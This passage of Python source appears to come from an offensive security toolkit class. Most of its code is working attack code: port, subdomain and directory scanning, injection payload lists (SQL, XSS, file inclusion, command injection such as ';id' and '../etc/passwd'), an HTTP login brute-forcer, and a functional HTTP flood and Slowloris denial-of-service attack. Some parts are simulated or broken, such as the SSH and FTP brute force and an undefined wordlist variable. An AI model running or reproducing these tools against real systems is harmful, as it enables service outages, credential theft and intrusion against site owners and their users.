    def port_scan(self, target, scan_type='quick', port_range=None, timeout=2):
        """Advanced port scanning"""
        scan_id = self.generate_id('port')
        self.active_scans[scan_id] = {'target': target, 'type': 'portscan', 'start': time.time()}
        
        try:
            start_time = time.time()
            
            # Resolve target
            try:
                ip = socket.gethostbyname(target)
            except:
                ip = target
            
            # Determine ports to scan
            if scan_type == 'quick':
                ports = list(range(1, 1024))  # Well-known ports
            elif scan_type == 'common':
                ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 
                        3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017, 9200]
            elif scan_type == 'full':
                ports = list(range(1, 1001))
            elif scan_type == 'stealth':
                ports = list(range(1, 1024))
            elif scan_type == 'udp':
                ports = [53, 67, 68, 69, 123, 137, 138, 139, 161, 162, 500, 514]
            else:
                ports = list(range(1, 1024))
            
            # Parse custom port range
            if port_range and '-' in port_range:
                try:
                    start, end = map(int, port_range.split('-'))
                    ports = list(range(start, end + 1))
                except:
                    pass
            
            open_ports = []
            
            def scan_port(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(float(timeout))
                    result = sock.connect_ex((ip, port))
                    
                    if result == 0:
                        # Try to get banner
                        banner = ''
                        try:
                            sock.settimeout(2)
                            if port == 80 or port == 443:
                                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                                banner = sock.recv(1024).decode('utf-8', errors='ignore').split('\n')[0]
                            elif port == 21:
                                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                            elif port == 22:
                                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                            elif port == 25:
                                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                        except:
                            pass
                        
                        service = self.get_service_name(port)
                        open_ports.append({
                            'port': port,
                            'service': service,
                            'state': 'open',
                            'banner': banner[:100] if banner else ''
                        })
                    
                    sock.close()
                except:
                    pass
            
            # Scan with threading
            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                executor.map(scan_port, ports)
            
            scan_time = round(time.time() - start_time, 2)
            
            result = {
                'target': target,
                'ip': ip,
                'open_ports': sorted(open_ports, key=lambda x: x['port']),
                'scan_time': scan_time,
                'total_ports': len(ports)
            }
            
            del self.active_scans[scan_id]
            return self.safe_json(result)
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return self.safe_json({'error': str(e), 'target': target})
    
    def dns_enumeration(self, domain, record_types=None):
        """DNS record enumeration"""
        scan_id = self.generate_id('dns')
        self.active_scans[scan_id] = {'target': domain, 'type': 'dns', 'start': time.time()}
        
        try:
            if record_types is None:
                record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT']
            
            result = {'domain': domain, 'records': {}}
            
            for record_type in record_types:
                try:
                    resolver = dns.resolver.Resolver()
                    answers = resolver.resolve(domain, record_type)
                    result['records'][record_type] = [str(rdata) for rdata in answers]
                except Exception as e:
                    result['records'][record_type] = []
            
            result['scan_time'] = round(time.time() - self.active_scans[scan_id]['start'], 2)
            del self.active_scans[scan_id]
            
            return self.safe_json(result)
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return self.safe_json({'error': str(e), 'domain': domain})
    
    def subdomain_scan(self, domain, wordlist='medium', threads=50):
        """Subdomain enumeration"""
        scan_id = self.generate_id('sub')
        self.active_scans[scan_id] = {'target': domain, 'type': 'subdomain', 'start': time.time()}
        
        try:
            # Select wordlist
            if wordlist == 'small':
                subdomains_list = self.wordlists['subdomains_small']
            elif wordlist == 'medium':
                subdomains_list = self.wordlists['subdomains_medium']
            elif wordlist == 'large':
                # Generate more subdomains
                subdomains_list = self.wordlists['subdomains_medium'] + \
                                 [f"server{i}" for i in range(1, 20)] + \
                                 [f"db{i}" for i in range(1, 10)] + \
                                 [f"app{i}" for i in range(1, 10)]
            else:  # huge
                subdomains_list = []
                # Generate many subdomains
                for i in range(1, 100):
                    subdomains_list.append(f"server{i}")
                    subdomains_list.append(f"node{i}")
                    subdomains_list.append(f"app{i}")
                    subdomains_list.append(f"web{i}")
                    subdomains_list.append(f"test{i}")
            
            found_subdomains = []
            
            def check_subdomain(sub):
                try:
                    full_domain = f"{sub}.{domain}"
                    socket.gethostbyname(full_domain)
                    found_subdomains.append(full_domain)
                except:
                    pass
            
            # Check with threading
            with concurrent.futures.ThreadPoolExecutor(max_workers=int(threads)) as executor:
                executor.map(check_subdomain, subdomains_list)
            
            scan_time = round(time.time() - self.active_scans[scan_id]['start'], 2)
            
            result = {
                'domain': domain,
                'subdomains': list(set(found_subdomains)),
                'scan_time': scan_time,
                'total_tested': len(subdomains_list)
            }
            
            del self.active_scans[scan_id]
            return self.safe_json(result)
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return self.safe_json({'error': str(e), 'domain': domain})
    
    def directory_scan(self, url, wordlist='medium', extensions=None, threads=20):
        """Directory and file bruteforce"""
        scan_id = self.generate_id('dir')
        self.active_scans[scan_id] = {'target': url, 'type': 'dirscan', 'start': time.time()}
        
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            # Select wordlist
            if wordlist == 'small':
                base_words = self.wordlists['dir_small']
            elif wordlist == 'medium':
                base_words = [
                    'admin', 'login', 'dashboard', 'panel', 'wp-admin', 'administrator',
                    'api', 'test', 'backup', 'config', 'data', 'db', 'secret', 'private',
                    'cgi-bin', 'robots.txt', '.git', '.env', 'config.php', 'phpinfo.php',
                    'test.php', 'index.php', 'index.html', 'backup.zip', 'dump.sql'
                ]
            elif wordlist == 'large':
                base_words = base_words + [
                    'uploads', 'downloads', 'files', 'images', 'assets', 'static',
                    'media', 'css', 'js', 'fonts', 'tmp', 'temp', 'cache', 'logs',
                    'session', 'archive', 'old', 'new', 'dev', 'staging', 'production'
                ]
            elif wordlist == 'dirb':
                base_words = [
                    # Common dirb wordlist entries
                    'admin', 'administrator', 'login', 'logout', 'register', 'signin',
                    'signup', 'dashboard', 'panel', 'control', 'wp-admin', 'wp-login.php',
                    'manager', 'sysadmin', 'root', 'backup', 'backups', 'bak', 'back',
                    'old', 'new', 'temp', 'tmp', 'cache', 'session', 'logs', 'config',
                    'configuration', 'settings', 'setup', 'install', 'update', 'upgrade',
                    'phpinfo.php', 'test.php', 'info.php', 'robots.txt', 'sitemap.xml',
                    '.git', '.svn', '.env', '.htaccess', '.htpasswd', 'config.php',
                    'database.php', 'db.php', 'sql.php', 'mysql.php', 'phpmyadmin',
                    'pma', 'myadmin', 'server-status', 'server-info'
                ]
            else:  # dirbuster
                base_words = base_words + [
                    'includes', 'templates', 'themes', 'plugins', 'modules', 'components',
                    'assets', 'static', 'media', 'uploads', 'downloads', 'files', 'images',
                    'css', 'js', 'fonts', 'vendor', 'lib', 'library', 'src', 'source',
                    'bin', 'scripts', 'tools', 'utils', 'utilities', 'helpers', 'classes',
                    'objects', 'models', 'views', 'controllers', 'routes', 'api', 'rest',
                    'graphql', 'webservice', 'ws', 'wss', 'socket', 'websocket', 'rpc'
                ]
            
            # Add extensions
            if extensions is None:
                extensions = ['', '.php', '.html', '.txt', '.bak', '.old', '.tar', '.zip', '.sql']
            
            wordlist_full = []
            for word in base_words:
                for ext in extensions:
                    wordlist_full.append(word + ext)
            
            found = []
            
            def check_path(path):
                try:
                    test_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
                    response = requests.get(test_url, timeout=3, verify=False, headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    })
                    
                    if response.status_code < 400:
                        # Extract page title if HTML
                        title = ''
                        if 'text/html' in response.headers.get('Content-Type', ''):
                            title_match = re.search(r'<title>(.*?)</title>', response.text, re.IGNORECASE)
                            if title_match:
                                title = title_match.group(1).strip()[:100]
                        
                        found.append({
                            'path': path,
                            'url': test_url,
                            'status': response.status_code,
                            'size': len(response.content),
                            'title': title
                        })
                except:
                    pass
            
            # Check with threading
            with concurrent.futures.ThreadPoolExecutor(max_workers=int(threads)) as executor:
                # Limit to first 1000 for performance
                executor.map(check_path, wordlist_full[:1000])
            
            scan_time = round(time.time() - self.active_scans[scan_id]['start'], 2)
            
            result = {
                'url': url,
                'found': found,
                'scan_time': scan_time,
                'total_tested': len(wordlist_full[:1000])
            }
            
            del self.active_scans[scan_id]
            return self.safe_json(result)
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return self.safe_json({'error': str(e), 'url': url})
    
    # ==================== VULNERABILITY SCANNING ====================
    
    def vulnerability_scan(self, url, depth='standard', checks=None):
        """Comprehensive vulnerability scanning"""
        scan_id = self.generate_id('vuln')
        self.active_scans[scan_id] = {'target': url, 'type': 'vulnscan', 'start': time.time()}
        
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            if checks is None:
                checks = {
                    'sqli': True, 'xss': True, 'lfi': True, 'cmd': True,
                    'headers': True, 'ssl': True, 'xxe': True, 'ssrf': True
                }
            
            vulnerabilities = []
            
            # Test connection and get base response
            try:
                response = requests.get(url, timeout=10, verify=False, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                })
                
                # Check security headers
                if checks.get('headers', True):
                    headers_analysis = self.check_security_headers(response.headers)
                    vulnerabilities.extend(headers_analysis)
                
                # Parse parameters from URL
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                
                # SQL Injection check
                if checks.get('sqli', True) and params:
                    sqli_results = self.check_sql_injection(url, params)
                    vulnerabilities.extend(sqli_results)
                
                # XSS check
                if checks.get('xss', True) and params:
                    xss_results = self.check_xss(url, params)
                    vulnerabilities.extend(xss_results)
                
                # LFI/RFI check
                if checks.get('lfi', True) and params:
                    lfi_results = self.check_lfi(url, params)
                    vulnerabilities.extend(lfi_results)
                
                # Command Injection check
                if checks.get('cmd', True) and params:
                    cmd_results = self.check_command_injection(url, params)
                    vulnerabilities.extend(cmd_results)
                
                # SSL/TLS check
                if checks.get('ssl', True) and url.startswith('https://'):
                    ssl_results = self.check_ssl(url)
                    vulnerabilities.extend(ssl_results)
                
                # XXE check (simplified)
                if checks.get('xxe', True):
                    xxe_results = self.check_xxe(url)
                    vulnerabilities.extend(xxe_results)
                
                # SSRF check (simplified)
                if checks.get('ssrf', True) and params:
                    ssrf_results = self.check_ssrf(url, params)
                    vulnerabilities.extend(ssrf_results)
                
            except Exception as e:
                vulnerabilities.append({
                    'name': 'Connection Error',
                    'description': f'Failed to connect to target: {str(e)}',
                    'severity': 'info',
                    'type': 'connection'
                })
            
            scan_time = round(time.time() - self.active_scans[scan_id]['start'], 2)
            
            result = {
                'url': url,
                'vulnerabilities': vulnerabilities,
                'scan_time': scan_time,
                'total_checks': len([v for v in vulnerabilities if v['severity'] in ['low', 'medium', 'high', 'critical']])
            }
            
            del self.active_scans[scan_id]
            return self.safe_json(result)
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return self.safe_json({'error': str(e), 'url': url})
    
    def check_security_headers(self, headers):
        """Check for missing security headers"""
        analysis = []
        
        security_headers = {
            'X-Frame-Options': {
                'description': 'Prevents clickjacking attacks',
                'severity': 'medium'
            },
            'X-Content-Type-Options': {
                'description': 'Prevents MIME sniffing',
                'severity': 'low'
            },
            'X-XSS-Protection': {
                'description': 'XSS protection (deprecated but still useful)',
                'severity': 'low'
            },
            'Content-Security-Policy': {
                'description': 'Content Security Policy',
                'severity': 'high'
            },
            'Strict-Transport-Security': {
                'description': 'HTTP Strict Transport Security',
                'severity': 'high'
            },
            'Referrer-Policy': {
                'description': 'Controls referrer information',
                'severity': 'low'
            },
            'Permissions-Policy': {
                'description': 'Permissions Policy (formerly Feature-Policy)',
                'severity': 'medium'
            }
        }
        
        for header, info in security_headers.items():
            if header not in headers:
                analysis.append({
                    'name': f'Missing Security Header: {header}',
                    'description': info['description'],
                    'severity': info['severity'],
                    'type': 'header',
                    'recommendation': f'Add {header} header to HTTP responses'
                })
        
        return analysis
    
    def check_sql_injection(self, url, params):
        """Check for SQL injection vulnerabilities"""
        vulnerabilities = []
        payloads_tested = 0
        
        sql_payloads = [
            "'", "\"", "1' OR '1'='1", "' OR '1'='1",
            "1' OR '1'='1' --", "1' OR '1'='1' #",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT 1,2,3--", "' UNION SELECT @@version--"
        ]
        
        for param, values in params.items():
            original_value = values[0]
            
            for payload in sql_payloads:
                payloads_tested += 1
                test_url = url.replace(f"{param}={original_value}", f"{param}={payload}")
                
                try:
                    response = requests.get(test_url, timeout=5, verify=False)
                    
                    # Check for SQL error messages
                    error_indicators = [
                        'sql', 'syntax', 'mysql', 'postgresql',
                        'oracle', 'database', 'query failed',
                        'sqlite', 'microsoft odbc', 'driver',
                        'invalid query', 'unclosed quotation',
                        'you have an error', 'warning:', 'mysql_fetch',
                        'pg_', 'ora_', 'mssql_'
                    ]
                    
                    if any(indicator in response.text.lower() for indicator in error_indicators):
                        vulnerabilities.append({
                            'name': 'SQL Injection Vulnerability',
                            'description': f'Parameter "{param}" appears vulnerable to SQL injection',
                            'severity': 'critical',
                            'type': 'sqli',
                            'parameter': param,
                            'payload': payload,
                            'location': 'URL parameter'
                        })
                        break
                except:
                    continue
        
        return vulnerabilities
    
    def check_xss(self, url, params):
        """Check for XSS vulnerabilities"""
        vulnerabilities = []
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]
        
        for param, values in params.items():
            original_value = values[0]
            
            for payload in xss_payloads:
                test_url = url.replace(f"{param}={original_value}", f"{param}={payload}")
                
                try:
                    response = requests.get(test_url, timeout=5, verify=False)
                    
                    # Check if payload appears in response (reflected XSS)
                    if payload in response.text:
                        vulnerabilities.append({
                            'name': 'Cross-Site Scripting (XSS) Vulnerability',
                            'description': f'Parameter "{param}" reflects user input without proper sanitization',
                            'severity': 'high',
                            'type': 'xss',
                            'parameter': param,
                            'payload': payload,
                            'location': 'URL parameter'
                        })
                        break
                except:
                    continue
        
        return vulnerabilities
    
    def check_lfi(self, url, params):
        """Check for LFI/RFI vulnerabilities"""
        vulnerabilities = []
        
        lfi_payloads = [
            "../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "../../../../windows/win.ini",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        
        for param, values in params.items():
            original_value = values[0]
            
            for payload in lfi_payloads:
                test_url = url.replace(f"{param}={original_value}", f"{param}={payload}")
                
                try:
                    response = requests.get(test_url, timeout=5, verify=False)
                    
                    # Check for common file contents
                    if 'root:' in response.text or '[fonts]' in response.text or 'PD9waHA' in response.text:
                        vuln_type = 'LFI'
                        if 'http://' in payload or 'https://' in payload:
                            vuln_type = 'RFI'
                        
                        vulnerabilities.append({
                            'name': f'{vuln_type} Vulnerability',
                            'description': f'Parameter "{param}" allows file inclusion',
                            'severity': 'critical',
                            'type': 'lfi' if vuln_type == 'LFI' else 'rfi',
                            'parameter': param,
                            'payload': payload,
                            'location': 'URL parameter',
                            'extracted_data': response.text[:200] + '...' if len(response.text) > 200 else response.text
                        })
                        break
                except:
                    continue
        
        return vulnerabilities
    
    def check_command_injection(self, url, params):
        """Check for command injection vulnerabilities"""
        vulnerabilities = []
        
        cmd_payloads = [
            ";ls", "|ls", "||ls", "&&ls",
            ";id", "|id", "||id", "&&id",
            ";whoami", "|whoami", "||whoami", "&&whoami"
        ]
        
        time_payloads = [
            ";sleep 5", "|sleep 5", "||sleep 5", "&&sleep 5"
        ]
        
        for param, values in params.items():
            original_value = values[0]
            
            # Test regular command injection
            for payload in cmd_payloads:
                test_url = url.replace(f"{param}={original_value}", f"{param}=127.0.0.1{payload}")
                
                try:
                    start_time = time.time()
                    response = requests.get(test_url, timeout=10, verify=False)
                    response_time = time.time() - start_time
                    
                    # Check for command output
                    if 'bin' in response.text or 'sbin' in response.text or 'root' in response.text:
                        vulnerabilities.append({
                            'name': 'Command Injection Vulnerability',
                            'description': f'Parameter "{param}" executes system commands',
                            'severity': 'critical',
                            'type': 'cmd',
                            'parameter': param,
                            'payload': payload,
                            'location': 'URL parameter',
                            'output': response.text[:200] + '...' if len(response.text) > 200 else response.text
                        })
                        break
                except:
                    continue
            
            # Test time-based command injection
            for payload in time_payloads:
                test_url = url.replace(f"{param}={original_value}", f"{param}=127.0.0.1{payload}")
                
                try:
                    start_time = time.time()
                    response = requests.get(test_url, timeout=10, verify=False)
                    response_time = time.time() - start_time
                    
                    if response_time > 5:
                        vulnerabilities.append({
                            'name': 'Time-Based Command Injection',
                            'description': f'Parameter "{param}" shows time delay indicating command execution',
                            'severity': 'high',
                            'type': 'cmd',
                            'parameter': param,
                            'payload': payload,
                            'location': 'URL parameter',
                            'response_time': response_time
                        })
                        break
                except:
                    continue
        
        return vulnerabilities
    
    def check_ssl(self, url):
        """Check SSL/TLS configuration"""
        vulnerabilities = []
        
        try:
            parsed = urllib.parse.urlparse(url)
            hostname = parsed.hostname
            
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate expiration
                    if 'notAfter' in cert:
                        exp_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        days_left = (exp_date - datetime.now()).days
                        
                        if days_left < 0:
                            vulnerabilities.append({
                                'name': 'SSL Certificate Expired',
                                'description': f'Certificate expired {abs(days_left)} days ago',
                                'severity': 'critical',
                                'type': 'ssl',
                                'expiry_days': days_left
                            })
                        elif days_left < 30:
                            vulnerabilities.append({
                                'name': 'SSL Certificate Expiring Soon',
                                'description': f'Certificate expires in {days_left} days',
                                'severity': 'medium',
                                'type': 'ssl',
                                'expiry_days': days_left
                            })
                    
                    # Check SSL version
                    cipher = ssock.cipher()
                    if cipher:
                        ssl_version = cipher[1]
                        if ssl_version in ['TLSv1', 'SSLv3', 'SSLv2']:
                            vulnerabilities.append({
                                'name': 'Weak SSL/TLS Version',
                                'description': f'Using {ssl_version} which is insecure',
                                'severity': 'high',
                                'type': 'ssl',
                                'ssl_version': ssl_version
                            })
        
        except ssl.SSLError as e:
            vulnerabilities.append({
                'name': 'SSL/TLS Error',
                'description': f'SSL connection failed: {str(e)}',
                'severity': 'medium',
                'type': 'ssl'
            })
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def check_xxe(self, url):
        """Check for XXE vulnerabilities (simplified)"""
        # This is a placeholder - real XXE testing requires XML input
        return []
    
    def check_ssrf(self, url, params):
        """Check for SSRF vulnerabilities (simplified)"""
        # This is a placeholder - real SSRF testing requires careful approach
        return []
    
    # ==================== ATTACK TOOLS ====================
    
    def brute_force(self, brute_type, config, usernames, passwords, threads=10, delay=100):
        """Brute force authentication"""
        scan_id = self.generate_id('brute')
        self.active_scans[scan_id] = {'target': config.get('url', ''), 'type': 'bruteforce', 'start': time.time()}
        
        try:
            attempts = 0
            found = None
            start_time = time.time()
            
            # Limit combinations for demo
            max_combinations = 100
            usernames = usernames[:min(len(usernames), 10)]
            passwords = passwords[:min(len(passwords), 10)]
            
            if brute_type == 'http':
                url = config['url']
                username_field = config.get('username_field', 'username')
                password_field = config.get('password_field', 'password')
                success_indicator = config.get('success_indicator', '')
                
                for username in usernames:
                    for password in passwords:
                        attempts += 1
                        
                        try:
                            data = {username_field: username, password_field: password}
                            response = requests.post(url, data=data, timeout=5, verify=False, allow_redirects=False)
                            
                            # Check for success
                            if response.status_code in [200, 301, 302, 303]:
                                if success_indicator:
                                    if success_indicator.lower() in response.text.lower():
                                        found = {'username': username, 'password': password}
                                        break
                                else:
                                    # Default success indicators
                                    if 'login' not in response.text.lower() and 'error' not in response.text.lower():
                                        found = {'username': username, 'password': password}
                                        break
                                    elif 'welcome' in response.text.lower() or 'dashboard' in response.text.lower():
                                        found = {'username': username, 'password': password}
                                        break
                                    elif 'Set-Cookie' in response.headers:
                                        found = {'username': username, 'password': password}
                                        break
                            
                            time.sleep(float(delay) / 1000)  # Convert ms to seconds
                            
                        except:
                            continue
                    
                    if found:
                        break
            
            elif brute_type == 'basic':
                url = config['url']
                
                for username in usernames:
                    for password in passwords:
                        attempts += 1
                        
                        try:
                            response = requests.get(url, timeout=5, verify=False, 
                                                  auth=(username, password))
                            
                            if response.status_code == 200:
                                found = {'username': username, 'password': password}
                                break
                            
                            time.sleep(float(delay) / 1000)
                            
                        except:
                            continue
                    
                    if found:
                        break
            
            elif brute_type == 'custom':
                # Custom brute force logic
                pass
            
            scan_time = round(time.time() - start_time, 2)
            
            result = {
                'target': config.get('url', ''),
                'type': brute_type,
                'attempts': attempts,
                'time': scan_time,
                'found': found
            }
            
            del self.active_scans[scan_id]
            return self.safe_json(result)
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return self.safe_json({'error': str(e)})
    
    def dos_attack(self, target, attack_type, threads, duration):
        """Denial of Service attack"""
        attack_id = f"dos_{int(time.time())}_{random.randint(1000, 9999)}"
        
        def http_flood():
            """HTTP flood attack"""
            requests_sent = 0
            bytes_sent = 0
            end_time = time.time() + int(duration)
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache'
            }
            
            while time.time() < end_time and attack_id in self.active_attacks:
                try:
                    # Send GET request
                    response = requests.get(target, timeout=1, verify=False, headers=headers)
                    requests_sent += 1
                    bytes_sent += len(response.content)
                    
                    # Send POST request
                    data = {'attack': 'test', 'random': random.randint(1, 1000000)}
                    response = requests.post(target, data=data, timeout=1, verify=False, headers=headers)
                    requests_sent += 1
                    bytes_sent += len(response.content)
                    
                    # Send HEAD request
                    response = requests.head(target, timeout=1, verify=False, headers=headers)
                    requests_sent += 1
                    
                except:
                    pass
            
            return requests_sent, bytes_sent
        
        def slowloris_attack():
            """Slowloris attack"""
            sockets = []
            requests_sent = 0
            
            try:
                parsed = urllib.parse.urlparse(target)
                host = parsed.hostname
                port = parsed.port or (443 if parsed.scheme == 'https' else 80)
                
                # Create partial connections
                for i in range(min(int(threads), 200)):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        sock.connect((host, port))
                        
                        # Send partial HTTP request
                        request = f"POST {parsed.path or '/'} HTTP/1.1\r\n"
                        request += f"Host: {host}\r\n"
                        request += "User-Agent: Mozilla/5.0\r\n"
                        request += "Content-Length: 1000000\r\n"
                        request += "\r\n"
                        sock.send(request.encode())
                        sockets.append(sock)
                        requests_sent += 1
                    except:
                        pass
                
                # Keep connections open
                end_time = time.time() + int(duration)
                while time.time() < end_time and attack_id in self.active_attacks:
                    time.sleep(1)
                    
                    # Send keep-alive data
                    for sock in sockets:
                        try:
                            sock.send(b"X-a: b\r\n")
                        except:
                            pass
                
                # Close sockets
                for sock in sockets:
                    try:
                        sock.close()
                    except:
                        pass
                        
            except Exception as e:
                print(f"Slowloris error: {e}")
            
            return requests_sent, 0
        
        # Start attack in background thread
        def run_attack():
            requests_sent = 0
            bytes_sent = 0
            
            if attack_type == 'http':
                requests_sent, bytes_sent = http_flood()
            elif attack_type == 'slowloris':
                requests_sent, bytes_sent = slowloris_attack()
            elif attack_type == 'syn':
                # SYN flood would require raw sockets (root privileges)
                pass
            elif attack_type == 'udp':
                # UDP flood
                pass
            elif attack_type == 'dns':
                # DNS amplification
                pass
            elif attack_type == 'ntp':
                # NTP amplification
                pass
            
            # Update attack status
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id].update({
                    'status': 'completed',
                    'total_requests': requests_sent,
                    'total_bytes': bytes_sent,
                    'end_time': time.time()
                })
        
        # Store attack info
        self.active_attacks[attack_id] = {
            'type': attack_type,
            'target': target,
            'threads': threads,
            'duration': duration,
            'start_time': time.time(),
            'status': 'running',
            'total_requests': 0,
            'total_bytes': 0
        }
        
        # Start attack thread
        thread = threading.Thread(target=run_attack)
        thread.daemon = True
        thread.start()
        
        return attack_id
    
    def ssh_brute_force(self, target, usernames, passwords):
        """SSH brute force (simulated for demo)"""
        scan_id = self.generate_id('ssh')
        self.active_scans[scan_id] = {'target': target, 'type': 'ssh', 'start': time.time()}
        
        try:
            attempts = 0
            found = None
            start_time = time.time()
            
            # Parse host:port
            if ':' in target:
                host, port_str = target.split(':')
                port = int(port_str)
            else:
                host = target
                port = 22
            
            # Simulate SSH brute force
            for username in usernames[:5]:
                for password in passwords[:5]:
                    attempts += 1
                    time.sleep(0.1)  # Simulate network delay
                    
                    # Demo logic - in real implementation, use paramiko
                    if username == 'root' and password == 'password':
                        found = {'username': username, 'password': password}
                        break
                
                if found:
                    break
            
            scan_time = round(time.time() - start_time, 2)
            
            result = {
                'target': target,
                'attempts': attempts,
                'time': scan_time,
                'found': found
            }
            
            del self.active_scans[scan_id]
            return self.safe_json(result)
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return self.safe_json({'error': str(e)})
    
    def ftp_brute_force(self, target, usernames, passwords):
        """FTP brute force (simulated for demo)"""
        scan_id = self.generate_id('ftp')
        self.active_scans[scan_id] = {'target': target, 'type': 'ftp', 'start': time.time()}
        
        try:
            attempts = 0
            found = None
            start_time = time.time()
            
            # Parse host:port
            if ':' in target:
                host, port_str = target.split(':')
                port = int(port_str)
            else:
                host = target
                port = 21
            
            # Simulate FTP brute force
            for username in usernames[:5]:
                for password in passwords[:5]:
                    attempts += 1
                    time.sleep(0.1)  # Simulate network delay
                    
                    # Demo logic - in real implementation, use ftplib
                    if username == 'anonymous' and password == '':
                        found = {'username': username, 'password': password}
                        break
                    elif username == 'ftp' and password == 'ftp':
                        found = {'username': username, 'password': password}
                        break
                
                if found:
                    break
            
            scan_time = round(time.time() - start_time, 2)
            
            result = {
                'target': target,
                'attempts': attempts,
                'time': scan_time,
                'found': found
            }
            
            del self.active_scans[scan_id]
            return self.safe_json(result)
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return self.safe_json({'error': str(e)})
    
    def web_crawler(self, url, depth=2, threads=10, options=None):
        """Web crawler with vulnerability checking"""
        scan_id = self.generate_id('crawl')
        self.active_scans[scan_id] = {'target': url, 'type': 'crawler', 'start': time.time()}
        
        try:
            if options is None:
                options = {
                    'extract_links': True,
                    'extract_emails': False,
                    'extract_phones': False,
                    'check_vulns': False
                }
            
            visited = set()
            pages = []
            emails = set()
            phone_numbers = set()
            vulnerabilities = []
            
            def crawl(current_url, current_depth):
                if current_depth > depth or current_url in visited:
                    return
                
                visited.add(current_url)
                
                try:
                    response = requests.get(current_url, timeout=5, verify=False, headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    })
                    
                    # Extract page info
                    page_info = {
                        'url': current_url,
                        'status': response.status_code,
                        'size': len(response.content),
                        'title': ''
                    }
                    
                    # Extract title if HTML
                    if 'text/html' in response.headers.get('Content-Type', ''):
                        title_match = re.search(r'<title>(.*?)</title>', response.text, re.IGNORECASE)
                        if title_match:
                            page_info['title'] = title_match.group(1).strip()[:100]
                    
                    pages.append(page_info)
                    
                    # Extract emails if requested
                    if options.get('extract_emails', False):
                        email_matches = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response.text)
                        emails.update(email_matches)
                    
                    # Extract phone numbers if requested
                    if options.get('extract_phones', False):
                        phone_matches = re.findall(r'\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}', response.text)
                        phone_numbers.update(phone_matches)
                    
                    # Extract links if requested
                    if options.get('extract_links', True) and current_depth < depth:
                        link_pattern = r'href=["\'](https?://[^"\']+)["\']'
                        links = re.findall(link_pattern, response.text)
                        
                        for link in links[:10]:  # Limit links per page
                            if link.startswith('http'):
                                crawl(link, current_depth + 1)
                    
                    # Check for vulnerabilities if requested
                    if options.get('check_vulns', False):
                        # Simple vulnerability checks
                        if 'password' in response.text.lower() and 'type="password"' in response.text.lower():
                            vulnerabilities.append({
                                'url': current_url,
                                'type': 'password_field',
                                'description': 'Password field found on page'
                            })
                        
                        if 'phpinfo()' in response.text:
                            vulnerabilities.append({
                                'url': current_url,
                                'type': 'phpinfo',
                                'description': 'phpinfo() output found'
                            })
                            
                except:
                    pass
            
            # Start crawling
            crawl(url, 0)
            
            scan_time = round(time.time() - self.active_scans[scan_id]['start'], 2)
            
            result = {
                'start_url': url,
                'pages': pages,
                'total_links': len(pages),
                'crawl_time': scan_time,
                'emails': list(emails),
                'phone_numbers': list(phone_numbers),
                'vulnerabilities': vulnerabilities
            }
            
            del self.active_scans[scan_id]
            return self.safe_json(result)
            
        except Exception as e:
            if scan_id in self.active_scans:
                del self.active_scans[scan_id]
            return self.safe_json({'error': str(e)})
    
    # ==================== UTILITY FUNCTIONS ====================
    
    def get_service_name(self, port):
        """Get service name for port"""
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
            443: 'HTTPS', 445: 'SMB', 3306: 'MySQL',
            3389: 'RDP', 5432: 'PostgreSQL', 6379: 'Redis',
            27017: 'MongoDB', 9200: 'Elasticsearch'
        }
        return services.get(port, 'Unknown')
    
